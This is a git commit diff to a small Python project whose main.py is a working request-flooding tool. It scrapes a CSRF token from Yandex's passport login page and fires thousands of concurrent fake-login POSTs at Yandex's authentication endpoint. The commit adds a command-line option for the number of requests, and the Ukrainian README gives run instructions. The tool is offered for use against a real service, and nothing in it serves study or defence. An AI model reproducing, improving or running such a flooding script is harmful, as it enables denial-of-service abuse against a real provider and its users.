3781a1a3093e7b2ccb363eb65c9fad770fd4e9e6
Bogdan B Peterson <bogdan.bryzh@gmail.com>
2022-02-27 21:09:07 +0200

    upd: added request param

--- README.md
+++ README.md
@@ -1,6 +1,16 @@
 # Інструкція
 
+Встановити aiohttp (один раз)
 ```bash
 pip3 install aiohttp
+```
+
+```bash
+python3 main.py -n <кількість запитів (число)>
+```
+
+або тисячу за замовчуванням
+
+```bash
 python3 main.py
 ```
--- main.py
+++ main.py
@@ -1,15 +1,15 @@
 import random
 import asyncio
 import aiohttp
-import secrets
 import string
+import argparse
 
 START_URL = "https://passport.yandex.by/auth"
 LOGIN_URL = "https://passport.yandex.by/registration-validations/auth/multi_step/start"
 HOST_LENGTH = 10
 SUFFIX_LENGTH = 5
 
-REQUEST_COUNT = 1000
+# REQUEST_COUNT = 1000
 
 CHARMAP = string.ascii_lowercase + string.digits
 
@@ -21,23 +21,37 @@ async def bomb(client):
         csrf_token = text[index + 19:index + 73]
         index = text.find("process_uuid")
         process_uuid = text[index + 13: index + 49]
-        
+
     # Extract CSRF_TOKEN
     host = "".join(random.choice(CHARMAP) for _ in range(HOST_LENGTH))
-    suffix= "".join(random.choice(CHARMAP) for _ in range(SUFFIX_LENGTH))    
+    suffix = "".join(random.choice(CHARMAP) for _ in range(SUFFIX_LENGTH))
     payload = {
         "csrf_token": csrf_token,
         "login": f"bandera{suffix}@{host}.com",
         "process_uuid": process_uuid,
     }
-    
+
     async with client.post(LOGIN_URL, data=payload) as resp:
         print(f"GOT RESPONSE - {resp.status}")
 
 
-async def main():
+async def run(request_count):
     async with aiohttp.ClientSession() as client:
-        jobs = [bomb(client) for _ in range(REQUEST_COUNT)]
+        jobs = [bomb(client) for _ in range(request_count)]
         await asyncio.gather(*jobs)
 
-asyncio.run(main())
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-n', type=int, default=1000,
+                        help='number of requests to perform')
+    args = parser.parse_args()
+    request_count = args.n
+    if request_count <= 0:
+        print("Request count must be a positive integer")
+    else:
+        asyncio.run(run(request_count))
+
+
+if __name__ == '__main__':
+    main()
